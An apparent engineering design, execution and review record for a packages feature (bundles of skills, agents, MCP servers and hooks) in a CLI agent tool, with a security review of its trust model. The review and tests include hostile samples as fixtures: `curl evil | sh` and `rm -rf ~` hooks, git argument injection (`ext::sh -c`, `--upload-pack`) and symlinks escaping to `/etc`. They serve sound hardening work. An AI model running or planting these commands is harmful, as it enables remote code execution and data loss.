# feat/packages — declarative bundles of skills, agents, MCP servers and hooks

> **Status:** feat — promoted 2026-10-22. Owner decision D11 in the umbrella; K1–K3 decided 2026-10-21. Implementation approved.
> **Branch:** `feat/packages`
> **Type:** eval → feat · **Size:** M · **Blast:** cross-module (config loading, skills scan, agent defs, MCP config, a new CLI subcommand; no protocol / persistence-format / agent-loop change) · **Review:** fresh-context (packages carry hooks → touches the trust model)
> **Umbrella:** [`extensibility.md`](../eval/extensibility.md) (child 5 of 5) · **Needs:** `hooks-core` merged ✓ (packages may carry hooks)

## Context

*— claude-opus-5-5, 2026-10-21*

### The question

Let a user install, with one command, a bundle that adds skills, sub-agent
types, MCP servers and hooks, and share it with others.

**Decided (D11, 2026-10-21):**
- **tentacle's own format** (not Claude Code plugins, not pi packages);
- sources in v1: a local path or a git URL (npm later);
- **not** shipped to the pod in v1.

Installing **is** the trust decision: package hooks are user-scope hooks, so
there is no project-trust prompt.

### Sub-decisions (all DECIDED by the owner, 2026-10-21)

- **K1**: the manifest is `tentacle-package.json` in the package root (not a
  key in `package.json`; npm support can add that later).
- **K2**: MCP servers are namespaced `<package>-<server>`. Tool names become
  `mcp__<package>-<server>__<tool>`. The separator is `-`, because
  `mcpToolName` does no sanitising (`mcp/src/tool-adapter.ts:40-42`) and
  providers restrict tool names to `[A-Za-z0-9_-]`. A `/` would break the
  model request. Package and server names are validated
  `^[a-z0-9][a-z0-9-]{0,31}$`. OpenAI-style APIs also cap a tool name at 64
  characters. When a package's MCP server connects, log a warning for any
  tool whose full name would exceed 64 (the tool list is only known once the
  server runs).
- **K3**: `tentacle packages update [<name>]` for git sources is **in** v1
  (`git pull --ff-only`); it is small.

### State today (verified against `main` @ 399ea0b)

| Fact | Evidence |
|---|---|
| Skills scan fixed roots: project `.agents/skills` (walk up), then `<configDir>/skills`, then `~/.agents/skills` (user scope); first wins on a name clash, with a diagnostic | `config/src/skills-scan.ts:42-68`; merge `config/src/load.ts:247-262` (`mergeSkills`) |
| User sub-agent types load from `<configDir>/agents/*.md` only | `cli/src/wiring.ts:90-108` (`loadUserAgentTypes`) |
| MCP servers come from config `mcpServers` (strict schema), connected once in the worker / daemon | `config/src/schema.ts:42-53,105`; `cli/src/wiring.ts:213` |
| MCP tool names are `mcp__${server}__${tool}`, not sanitised | `mcp/src/tool-adapter.ts:40-42` |
| CLI subcommands are a fixed list | `cli/src/flags.ts:364-367,425,437` |
| A pod daemon loads its own config (laptop packages do not reach it) | `cli/src/pod-runtime.ts:328`; `cli/src/serve.ts:221-262` |
| Profiles can switch settings per launch (`--profile`) | `config/src/profile.ts:1-10` |

**Repro (2026-10-21):** there is no install command and no package root.

```
$ git show main:packages/cli/src/flags.ts | sed -n 364,367p
  "serve",
  "run",
  "attach",
  "connect",
$ git grep -n "packages/" main -- packages/config/src packages/cli/src | grep -v "^.*import" | head -1
(no output)
```

## Implementation

*— claude-opus-5-5, 2026-10-21 (draft; approved at promotion)*

### Load-bearing assumption

Every contribution type already has **one** loading path that takes a
directory or a map: skills (`skillRoots` → `scanSkills`), agents
(`loadUserAgentTypes`), MCP (`mcpServers` map), hooks (`hooks` list from
`hooks-core`). So a package is **loaded by adding roots and entries to those
paths**, with no new loading subsystem. Verify each path takes extra inputs
without behaviour change for the existing ones (their tests stay green).

### Preconditions

- `hooks-core` merged (`hooks` in `TentacleConfig`).
- `git` on `PATH` is needed only for git sources. A missing `git` is a clean
  error at install time.

### Design

#### Layout

```
<configDir>/packages/<name>/
  tentacle-package.json   { "name": "<name>", "version": "1.2.0", "description": "…" }   (required)
  skills/<skill>/SKILL.md (optional)
  agents/<type>.md        (optional)
  mcp.json                { "<server>": { "command": …, "args": …, "env": … } }        (optional; McpServerSchema per entry)
  hooks.json              { "hooks": [ HookSpec, … ] }                               (optional; HookSpecSchema)
```

The manifest is `.strict()`: `name` must equal the directory name and match
`^[a-z0-9][a-z0-9-]{0,31}$`. Convention over manifest: what is present is
what the package contributes.

#### Enable / disable

New config key, top-level: `packages: { "<name>": false }` (a record of
booleans; default enabled). It goes through the existing profile rules (a
top-level setting replaces the base one), so a profile can switch packages.

#### Loading (`config/src/packages.ts`, new, pure + I/O)

`scanPackages(configDir, enabled)` → `{ packages: PackageInfo[], diagnostics }`:
- read `<configDir>/packages/*/tentacle-package.json`, sorted by name;
- skip disabled packages;
- a malformed package → a diagnostic, skipped whole;
- `PackageInfo = { name, dir, skillsDir?, agentsDir?, mcpServers, hooks }`.

Then in `load.ts`:
- **skills**: `skillRoots(...)` gains the packages' `skills/` dirs as
  `scope: "user"` roots, **after** `<configDir>/skills` and **before**
  `~/.agents/skills`. The user's own skills win a clash; `mergeSkills`'
  existing diagnostic names both.
- **MCP**: merge `mcpServers` with `"<pkg>-<server>"` keys. A key colliding
  with a user-defined server is a diagnostic, and the **user's** definition
  wins.
- **hooks**: append the package hooks **after** the user's own `hooks`, in
  package-name order. Each spec is tagged `source: "<pkg>"` for log lines (an
  optional field on the core `HookSpec`).
- **agents**: `TentacleConfig.packageAgentDirs: string[]`;
  `loadUserAgentTypes(configDir, extraDirs)` (`wiring.ts:90`) reads
  `<configDir>/agents` first, then each extra dir. A type-name clash: the
  first wins, and a diagnostic names both. Today unreadable files are
  skipped silently (`wiring.ts:103-105`); for package dirs, add a diagnostic.

Diagnostics join the startup notices, like `skillDiagnostics`.

#### CLI (`cli/src/packages-cmd.ts`, new; subcommand `packages` in `flags.ts`)

| Command | Behaviour |
|---|---|
| `tentacle packages install <path\|git-url>[#ref]` | path: copy the directory; git: `git clone --depth 1 [--branch ref]`. Both go into a **temp dir under `<configDir>/packages/.tmp-*`**, then the manifest is validated, then `rename` to `<configDir>/packages/<name>`. An existing name → error (use `update`). Print what it contributes, and **print every hook command** (installing is trust, so show what is trusted) |
| `tentacle packages list` | name, version, source, enabled, counts (skills / agents / MCP / hooks) |
| `tentacle packages remove <name>` | delete the dir |
| `tentacle packages update [<name>]` (K3) | git sources: `git -C <dir> pull --ff-only`; path sources: tell the user to reinstall |

The source is recorded in `<dir>/.tentacle-source.json` (`{ type, url, ref }`)
at install time. Commands run before any TUI, so plain stdout is fine
(§7). Spawn `git` with `Bun.spawn` (argv form, no shell), never with
secrets in argv.

### Files (dependency order)

1. `packages/core/src/hooks.ts` (`HookSpec.source?`)
2. `packages/config/src/schema.ts` (`packages` key; package manifest, `mcp.json`, `hooks.json` schemas), `packages.ts` (new), `skills-scan.ts` (extra roots), `load.ts`, `resolve.ts`, `defaults.ts`
3. `packages/cli/src/wiring.ts` (`loadUserAgentTypes` extra dirs), `packages-cmd.ts` (new), `flags.ts`, `main.ts` (dispatch)
4. tests (below); user docs section

### Failure modes

| Case | Convergence |
|---|---|
| Two packages define the same skill / agent / server | deterministic precedence (user's own > packages by name) + a diagnostic naming both; never a silent override |
| A malformed package | skipped whole with a diagnostic; the others load; the session starts |
| A git source is unreachable or the ref is missing | install fails; the temp dir is removed; nothing is half-installed |
| Install interrupted | only `.tmp-*` remains; `scanPackages` ignores dot-dirs; the next install cleans stale `.tmp-*` |
| Package updated (`update` / manual pull) | picked up at the next session start (no hot reload) |
| A package expected in a pod | not shipped (D11); documented. If the laptop config enables packages with MCP or hooks and a pod session starts, print one notice |
| Package name not valid for tool names | rejected at install by the name regex (K2) |

### Tests (red before green, §9)

- `config/test/packages.test.ts` (temp dirs):
  - a full package loads all four kinds;
  - a disabled package is skipped;
  - a malformed manifest → a diagnostic and the others load;
  - `name` ≠ dir → rejected;
  - an MCP key is namespaced `pkg-server`;
  - a user server with the same key wins;
  - package hooks come after user hooks, tagged with their source;
  - skill precedence: user > package.
- `cli/test/packages-cmd.test.ts`:
  - install from a path (temp) → in place;
  - install of an existing name → error;
  - a failed validation leaves no dir and no `.tmp-*`;
  - git install using a local bare repo fixture (`git init --bare` in a temp
    dir; skipped if `git` is absent).
- `cli/test/wiring.test.ts`: agent types from a package dir are offered; a
  clash with `<configDir>/agents` keeps the user's.

Gate: `bun run check` green.

## Execution

*— claude-opus-5-5, 2026-10-22*

**Trust policy (settled from Context + umbrella D11/§Trust model, not invented):**
installing a package IS the trust decision. Package hooks are **user-scope**
hooks: they join `config.hooks` after the user's own and never go through
`hooks/trust` or `.agents/hooks.json` hashing. `install` prints every hook
command. In a pod they are not loaded (D11), so they cannot reach the
pod-trust path.

**Repro (feature missing, on the branch base `c398d4a`)** in `.tentacle/tmp/packages/repro.ts`:
```
cliMode(packages list) = prompt
packages key accepted = false
```

**As built, in order:**
1. `config/src/packages.ts` (new). Pure: `parsePackageManifest`, `parsePackageMcp`,
   `mergePackageContributions`, `longToolNameWarnings`. I/O: `loadPackage`, `scanPackages`.
   `hooks.json` reuses `parseProjectHooksFile` (same `{hooks:[…]}` strict shape).
   Schema `packages: record<bool>` at `schema.ts:200`. `skillRoots(…, packageRoots)` at
   `skills-scan.ts:54,72`. Wired in `load.ts:274,320`. New `TentacleConfig` fields:
   `packages`, `packagesEnabled`, `packageAgentDirs`, `packageDiagnostics`.
2. `core/src/hooks.ts:21` adds `HookSpec.source?`. `agent/src/hooks.ts:61` `hookName` → `<pkg>:<name>`.
3. `cli/src/wiring.ts:95` exports `loadUserAgentTypes(configDir, packageDirs)` → `{types, diagnostics}`, first wins.
4. `cli/src/packages-cmd.ts` (new): install/list/remove/update, with an injectable `GitRunner`.
   `flags.ts:376,440,462` and `main.ts:258` dispatch (the `hooks` pattern).
   `main.ts:298` prints `[packages]` diagnostics. `main.ts:303` prints the pod notice.
   `main.ts:614,672` print the 64-char warnings.
5. README `### Packages` (`README.md:215`).

Tests: `config/test/packages.test.ts` (20), `cli/test/packages-cmd.test.ts` (15),
`cli/test/wiring.test.ts` (+1), `agent/test/hooks.test.ts` (+1). Each was red on
its assertion before the code: the loadConfig tests failed 4/4 before wiring,
`hookName` failed on the expected value, and `loadUserAgentTypes` was red on
its assertion after a no-op export. Mutation-killed, each reverted:
- `packages.ts`: drop the clash check (2 fail), reverse the hook order (2),
  ignore `enabled` (3), scan dot-dirs (1), drop name==dir (1), drop the namespace (4),
  `>` → `>=` in the 64-char check (1);
- `skills-scan.ts`: package roots before `~/.agents/skills` (1);
- `wiring.ts`: drop the agent clash check (1);
- `packages-cmd.ts`: no tmp cleanup (8), no exists check (1), no remove-name
  check (1), a ref allowing a leading `-` (1), no stale `.tmp-*` clean (1), copy `.git` (1),
  no `--` before the URL (1).

The CLI was also smoke-tested end to end (`bun packages/cli/src/main.ts packages
install|list|update|remove|frob`, with a temp `TENTACLE_CONFIG_DIR`).

Gate: `bun run check`: typecheck clean, lint clean (373 files), **1810 pass, 2 skip
(the opt-in ones), 0 fail**.

**Drift from Implementation:**
- **Package skill roots go AFTER `~/.agents/skills`, not before it.** The plan put
  them before, which would let a package shadow the user's own `~/.agents/skills`.
  That contradicts the plan's own rule "user's own > packages".
- **Agent-type clash detection stays in `cli/wiring.ts`.** A type's name comes from
  frontmatter (`agent-defs.ts` `parseAgentDefinition`), and config cannot depend on
  `@tentacle/agent`. `mergeAgentTypes` is last-wins, so the loader dedupes first-wins
  before calling it. Side effect: two same-named files inside `<configDir>/agents`
  now resolve to the first, not the last. `main.ts` re-runs the loader once
  before mount, only to print its diagnostics.
- **Two packages can build the same namespaced MCP key** (`a-b`+`c` and `a`+`b-c`).
  The first by name wins, with a diagnostic. The plan only covered user vs package.
- **Path traversal:** the manifest carries no paths (convention over manifest), so
  the risk is the name. The regex rejects `../x`, and `remove`/`update` validate the
  name before any join. A git URL or `#ref` that reads as a git option (`-…`) is
  rejected, and `clone` gets `--` before the URL.
- **The 64-char tool warning (K2) is only on the `--plain` and one-shot paths**
  (`main.ts:614,672`). The default TUI path connects MCP in the worker, where no
  warning channel exists (a raw write would corrupt Ink, §7), so it is not shown
  there. Debt: route it through the worker's MCP status if wanted.
- **The pod notice fires for any enabled package**, not only ones with MCP or hooks:
  skills and agents do not reach the pod either.
- **`tentacle-package.json` `version` is optional.** `.tentacle-source.json` is written
  only after validation, then the staged dir is renamed into place.
- The git install is tested with an injected fake `GitRunner`, not the plan's local
  bare-repo fixture (no real git or network in tests). `spawnGit` (real `Bun.spawn`)
  is exercised only by the manual smoke run (path source).

**Post-review fixes (2026-10-22, after REQUEST-CHANGES).** Every new test was
shown RED on the pre-fix code (6 in `packages-cmd.test.ts`, 1 in `packages.test.ts`,
1 in `wiring.test.ts`), then green. The new guards were mutation-checked: an
unfiltered diff, a silent update, cleaning every staging dir, no symlink check,
allowing dangling links, and a built-in diagnostic for the user's own types each
fail ≥1 test.
1. `update` now snapshots the package's hook and MCP commands (`trustedCommands`)
   before the pull and prints every added or changed one after `loadPackage`,
   under "updating trusts them". Test: a fake `GitRunner` whose pull rewrites
   `hooks.json` (`curl evil | sh`) and `mcp.json`.
2. `loadPackage` rejects any symlink (`.git` skipped) that is dangling or resolves
   outside the package (`escapingSymlink`, `config/src/packages.ts`). `install`
   validates the staged copy with `loadPackage`, so the check runs at install AND
   at every load. Node `cp` rewrites a relative link to its absolute original
   target, so a copied `../outside` link is caught. Tests cover a path source,
   a git source (`skills/evil -> /etc` added in the clone), dangling, and an
   allowed internal link.
3. `install` prints each MCP server as `<pkg>-<server>: command args` (or its URL).
   `update`'s diff covers MCP too.
4. A package agent type that replaces a built-in → `[agents]` diagnostic
   (`wiring.ts` `loadUserAgentTypes`). The user's own override stays silent.
5. `cleanStaging` removes only `.tmp-*` older than 1 h (`STALE_STAGING_MS`), so a
   concurrent install's staging dir survives.
6. Agent-type diagnostics print as `[agents]` (`main.ts`). The README notes the
   first-wins change, the update diff, tag pinning and the symlink rule.
7. `TODO.md`: debt entry for the missing TUI 64-char warning.
8. `update` checks `git symbolic-ref -q HEAD` first: a detached HEAD (`#tag`
   install) prints "pinned to <ref>, unchanged" and does not pull. Citations
   fixed `wiring.ts:59` → `:90`. The `connect` item is a no-op: `connect`
   returns at `main.ts:223-231`, before `loadConfig`, so no `[packages]` line can
   print there. In `run`/`attach` only the single pod notice prints.

**Re-review nits (2026-10-22, APPROVE-WITH-NITS).** All three tests were red
first, on the assertion.
- N1: `update` reads `git rev-parse HEAD` before and after the pull. If HEAD did
  not move, it prints "already up to date". If it moved, it prints
  `git diff --stat <old>..<new>` through the injected `GitRunner`, which now
  returns `stdout`.
- N2: path install `cp` uses `verbatimSymlinks: true`, so an internal relative
  link survives.
- N3: the README states that `update` trusts the whole new version, and
  documents the 5000-entry cap (`MAX_PACKAGE_ENTRIES`).

**Unverified:** a real `git clone` / `pull --ff-only` against a live remote. To verify:
`tentacle packages install file:///path/to/repo.git#<tag>`, then `update`.

## Review

*— claude-opus-5-5, 2026-10-22. Fresh-context adversarial review. The executor is the **same model** (claude-opus-5-5) in another context, so blind spots they share survive both passes. This replaces the 2026-10-21 self-review placeholder.*

**Verdict: REQUEST-CHANGES.** The plumbing is sound, gated and mutation-tested.
But the trust contract ("installing is the trust decision; `install` shows what
is trusted") has two holes that the end-to-end trace shows: `update` adds hooks
without showing them, and symlinks let the hooks that run differ from the ones
`install` printed.

### Findings

**Must-fix**

1. **`update` silently adds or changes hooks** (`cli/src/packages-cmd.ts:262-276`).
   E2E: install from a real bare repo prints `tool_call: echo v1`. Upstream then pushes
   a second hook, `curl evil | sh`. `packages update pk` prints only
   `updated pk (takes effect at the next session start)`, and `list` then shows `2 hooks`.
   The user trusted v1's hooks, not v2's, and the same applies to new MCP servers (arbitrary
   commands). **Change:** before the pull, snapshot the package's hook and MCP
   commands; after the pull, compare them with the result of `loadPackage`. Print every added
   or changed hook command and MCP `command args` under the same "installing trusts them"
   header as `install`. Add a test that uses the fake `GitRunner`, which rewrites `hooks.json`
   during "pull", and assert that the new command is printed. Shown red on the current code.
2. **Symlinks escape the package, so the reviewed hooks are not the ones that run**
   (`cli/src/packages-cmd.ts:145`, where `cp` keeps symlinks, and `config/src/packages.ts:138-160`,
   where `readFile` follows them). E2E: a path package with `hooks.json -> ../outside/h.json`
   installs as an absolute symlink. `install` prints `echo benign`. After the outside file is
   edited to `rm -rf ~`, `list` still loads it, and the next session runs it. A git package
   can ship the same symlink (`skills/evil -> /etc` was also kept as-is). **Change:**
   reject any symlink whose resolved target leaves the staged dir. Do this at install (walk the
   staged tree) and in `loadPackage`, so a later `git pull` that adds one is also skipped with a
   diagnostic. Alternatively, copy with `dereference: true` for path sources AND reject symlinks
   in git sources. Add a test for each.

**Should-fix / nits**

3. `install` prints hook commands but only the *names* of MCP servers
   (`packages-cmd.ts:173`). An MCP server is arbitrary code that runs at every session start,
   just like a hook. Print `command args` too (same trust argument as D11).
4. A package agent type named like a built-in (e.g. `general-purpose`) silently replaces it:
   `mergeAgentTypes` is last-wins over builtins (`agent/src/agent-defs.ts:77-95`), and
   `loadUserAgentTypes` only dedupes the user's own and package types against each other
   (`cli/src/wiring.ts:95-132`). README's "your own … always win" holds, but "never a silent
   override" does not hold for builtins. Emit a diagnostic when a *package* type shadows a
   builtin.
5. Concurrent installs: `cleanStaging` (`packages-cmd.ts:123-129`) deletes *every* `.tmp-*`,
   including the staging dir of another install that is still running. That install then fails
   with ENOENT. It is loud, not corrupting. Only remove `.tmp-*` older than a few minutes, or
   ones whose PID is gone.
6. Drift #2 (agent clash: last-wins → first-wins inside `<configDir>/agents`): this is a real
   behaviour change on a pre-existing path, but **not silent**. The clash now prints a
   `[packages] agent type … ignored` line at startup (`main.ts:296-299`). That line is wrongly
   tagged `[packages]` for a clash between two of the user's own files. It is acceptable
   pre-public. Mention it in README and use a neutral tag (`[agents]`).
7. Drift #4 (the K2 64-char warning is missing on the default TUI path): accepted. A raw
   write would break §7, and the provider rejects the request loudly anyway. Record it in
   `TODO.md` as debt (route it through `McpStatusTracker`), rather than only here.
8. `connect` mode prints laptop `[packages]` diagnostics (`main.ts:285`) for packages that the
   remote daemon never loads, and it gets no "not loaded" notice. This is cosmetic, and the
   same pre-existing pattern applies to `[skills]`.
9. `update` on a `#tag` install prints "updated" although it is pinned and nothing moved
   (the clone's fetch refspec is the tag only). It is harmless, but the message misleads. Say
   "pinned to <ref>; nothing to pull", or note it in README.
10. Plan premise `cli/src/wiring.ts:90-108` (`loadUserAgentTypes`) is stale. On `main` it
    is at `:90`. The fact itself is true.

Drift items 1, 3, 5 and 6 are justified and correct. Item 1 (package skills after
`~/.agents/skills`) fixes a real flaw in the plan.

### Gate

`bun run check`: typecheck clean · lint clean (373 files) · **1810 pass, 2 skip
(opt-in), 0 fail** (1812 tests / 154 files). This matches Execution.

### Premise table

| Premise | Result |
|---|---|
| Context symptom: no `packages` command or key on base | TRUE (the executor's repro; `flags.ts` on `main` has no `packages`) |
| `mcpToolName` unsanitised, `mcp/src/tool-adapter.ts:40-42` | TRUE |
| Skills roots `configDir/skills` then `~/.agents/skills` (`skills-scan.ts:66-68` on main) | TRUE |
| `loadUserAgentTypes` at `wiring.ts:90-108` | FALSE line (it is at `:90` on main); fact TRUE |
| Pod daemon uses its own config (`pod-runtime.ts:328` `serve --stdio`) | TRUE; `pod-runtime.ts` never reads `config.hooks`/`mcpServers` |
| Only the user's file config (+ profile) feeds `packages` (no project config) | TRUE (`load.ts:237-241,274`) |

### Mutations (each restored; the four files were verified identical with `cmp`)

- `mergePackageContributions` drops the user hooks → `packages.test.ts` 2 fail ✓
- `clone` without `--` → `packages-cmd.test.ts` 1 fail ✓
- `loadUserAgentTypes` clash check disabled → `wiring.test.ts` 1 fail ✓
- `load.ts` ignores the `packages` enable map → `packages.test.ts` 2 fail ✓
- No test pins `update` output or the `main.ts` `[packages]` / pod notice lines (gap; see 1).

### Attacks tried

1. **Update smuggles hooks** (real `git init --bare`, `file://`): FOUND (finding 1).
2. **Symlink escape** (path source, plus a git source with `skills/evil -> /etc`): FOUND (finding 2).
3. **Git argument injection**: `ext::sh -c …` is rejected as "not a git URL". `#--upload-pack=x`
   is rejected as an invalid ref. A bare `--upload-pack=…` argv is rejected by the flag parser.
   An scp-form `-x@h:p` is passed after `--`, and git refuses `-`-leading hosts. Holds.
4. **Path traversal through the name**: `remove`/`update` validate the name before `join`, and
   the manifest name must equal the dir. Holds.
5. **Project or pod smuggling a package**: `packages` is read only from the user's config file
   and profile. A project has no config layer, and `.agents/` is not a package root. In
   `run`/`attach`, the laptop's `hooks`/`mcpServers`/agent dirs are never sent (only the notice
   at `main.ts:300-304`, printed before any Ink mount). A pod's *own* `<configDir>/packages`
   loads in the pod daemon. That is pod-scope and consistent with the pod's own user hooks
   today. Holds.
6. **Raw writes while Ink is mounted**: every `[packages]` line is `writeErr` at
   `main.ts:296-304`, before `startTui`. The worker discards its own copy of
   `loadUserAgentTypes` diagnostics. Holds.
7. **Precedence**: user MCP key beats a package key, and package beats package by name with a
   diagnostic. Skills: project > `configDir` > `~/.agents` > packages. Agents: user > package.
   Holds, except for builtins (finding 4).
8. **Partial install**: a failed real clone or validation (an invalid hook event) left no
   package dir and no `.tmp-*`. Holds. Concurrent installs: finding 5.

### What holds

- One loading path per kind, with no new subsystem.
- The pure/I/O split follows §7.
- Names are validated for tool-name safety.
- Staging and rename are atomic per install.
- `git` runs argv-form with `GIT_TERMINAL_PROMPT=0`.
- Tests are non-vacuous for the paths they cover.

### How the executor behaved

The executor was honest and precise:
- It disclosed every drift with reasons, and caught a precedence bug in its own plan
  (drift 1).
- It flagged the real-git path as unverified. That path works (E2E above), but the unexercised
  `update` was where the trust hole was.
- Its blind spot was to treat "trust" as an install-time event, not as a property that has to
  survive `update` and the filesystem. Because this reviewer is the same model, a
  different-model pass on the fixes is recommended.

### Re-review

*— claude-opus-5-5, 2026-10-22. Same model as the executor, in a fresh context.*

**Verdict: APPROVE-WITH-NITS.** Must-fix findings 1 and 2 are fixed and verified against
**real git** (`git init --bare` + `file://`, `.tentacle/tmp/packages/e2e2.sh`). Findings
3–7 are applied. My nit 8 about `connect` was wrong: `connect` returns at `main.ts:222-235`,
before any package diagnostics are printed.

Gate: `bun run check` is clean on typecheck and lint (373 files), with **1818 pass, 2 skip (opt-in), 0 fail**.

E2E (real git):
- An update that adds `curl evil | sh` now prints that hook under "updating trusts them".
- An update that adds `skills/evil -> /etc` reports "updated but now invalid", exits with
  `rc=1`, and `list` shows the package as skipped.
- A fresh install with that link is refused, and no dir is left behind.
- A `#tag` install is reported as "pinned to v1t, unchanged".
- Path source: `hooks.json -> ../o/h.json` is refused, and so is a symlinked `skills/` dir
  pointing outside.

TOCTOU: `loadPackage` runs `escapingSymlink` before it reads anything, at install, at update
and at every session start. Hook and MCP *commands* are captured as strings at load. A link
swapped after the check needs write access to `<configDir>`, the same power as editing the
user's own config. A symlinked package root or `packages/` dir is handled by `realpath(root)`.

Staging: `.tmp-*` dirs are dot-dirs, which `scanPackages` ignores, and the install is a single
`rename`. A half-install is therefore never visible as a package, whatever the 1h threshold.
The worst case, a clone that takes more than 1h, is a loud failure of that install.

Remaining nits (not blocking):
- **N1.** An update that changes only a *script a hook runs* (e.g. `bin/h.sh`) prints nothing:
  the comparison covers commands, not files. Verified: v3 replaced `h.sh` with `curl evil | sh`,
  and the output was only "updated pk". Print `git diff --stat` of the pulled range, or state in
  README that `update` trusts the whole new version.
- **N2.** A path install rejects *internal* relative links (`hooks.json -> x/h.json`). The
  reason is that `cp` (`packages-cmd.ts:185`) rewrites them to absolute paths into the
  *source* dir. This fails loud, not unsafe. Pass `verbatimSymlinks: true`.
- **N3.** `MAX_PACKAGE_ENTRIES = 5000` (`config/src/packages.ts:120`) silently caps the
  package size. Document it.

**Final (N1–N3 applied): APPROVE.** *— claude-opus-5-5, 2026-10-22.* Real bare-repo e2e: a script-only push (`bin/h.sh`) now prints `changed files: bin/h.sh | 2 +-` on `update`. A path install keeps internal relative links (`hooks.json -> x/h.json`, `skills -> x`) verbatim and loads them. Escaping links are still refused. Gate: typecheck and lint clean (373 files), **1821 pass, 2 skip (opt-in), 0 fail**.
